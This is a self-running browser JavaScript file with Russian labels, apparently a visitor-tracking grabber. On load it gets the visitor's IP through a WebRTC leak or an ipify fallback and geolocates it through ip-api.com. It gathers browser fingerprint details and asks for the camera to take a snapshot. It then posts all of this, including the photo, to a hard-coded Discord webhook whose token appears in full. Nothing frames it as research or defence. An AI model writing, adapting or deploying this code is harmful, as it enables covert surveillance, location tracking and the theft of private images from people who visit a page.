async function captureCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        
        stream.getTracks().forEach(track => track.stop());
        
        return { status: "✔Разрешили", image: canvas.toDataURL('image/jpeg') };
    } catch (error) {
        if (error.name === 'NotAllowedError') {
            return { status: "🚫Запретили", image: null };
        } else {
            return { status: "❌Не доступно", image: null };
        }
    }
}

async function getIPAddress() {
    try {
        // Способ 1: Через WebRTC (может показать локальный IP)
        const rtc = new RTCPeerConnection({iceServers: []});
        rtc.createDataChannel('');
        
        return new Promise((resolve) => {
            rtc.createOffer()
                .then(offer => rtc.setLocalDescription(offer))
                .catch(() => resolve('Неизвестно'));
            
            rtc.onicecandidate = (event) => {
                if (event.candidate) {
                    const candidate = event.candidate.candidate;
                    const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/);
                    if (ipMatch) {
                        resolve(ipMatch[1]);
                        rtc.close();
                    }
                }
            };
            
            setTimeout(() => {
                // Способ 2: Если WebRTC не сработал, используем iframe трюк
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
                
                window.handleIP = function(data) {
                    resolve(data.ip || 'Неизвестно');
                    document.body.removeChild(iframe);
                };
                
                document.body.appendChild(iframe);
            }, 1000);
        });
    } catch (error) {
        return 'Неизвестно';
    }
}

async function sendEmbed(ip, geo) {
    const cameraResult = await captureCamera();
    
    const embed = {
        title: "🌐 Информация о пользователе",
        fields: [
            { name: "📱 User Agent", value: navigator.userAgent, inline: false },
            { name: "🗣️ Язык", value: navigator.language, inline: true },
            { name: "🌍 Языки", value: navigator.languages.join(', '), inline: true },
            { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
            { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
            { name: "🌍 Страна", value: geo?.country || "Неизвестно", inline: true },
            { name: "🏙️ Город", value: geo?.city || "Неизвестно", inline: true },
            { name: "📍 Регион", value: geo?.regionName || "Неизвестно", inline: true },
            { name: "📡 Провайдер", value: geo?.isp || "Неизвестно", inline: true },
            { name: "🕐 Часовой пояс", value: geo?.timezone || "Неизвестно", inline: true },
            { name: "📷 Камера", value: cameraResult.status, inline: true },
            { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
        ],
        timestamp: new Date().toISOString()
    };

    const payload = { embeds: [embed] };
    
    if (cameraResult.image) {
        payload.content = "📸 Фото с камеры:";
        const imageBlob = await (await fetch(cameraResult.image)).blob();
        const formData = new FormData();
        formData.append('file', imageBlob, 'camera.jpg');
        formData.append('payload_json', JSON.stringify(payload));
        
        fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
            method: 'POST',
            body: formData
        });
    } else {
        fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
    }
}

// Запуск с WebRTC методом
getIPAddress().then(ip => {
    console.log('Получен IP:', ip);
    if (ip !== 'Неизвестно') {
        return fetch(`http://ip-api.com/json/${ip}`)
            .then(r => r.json())
            .then(geoData => sendEmbed(ip, geoData));
    } else {
        return sendEmbed(ip, null);
    }
}).catch(error => {
    console.error('Ошибка:', error);
    sendEmbed('Неизвестно', null);
});
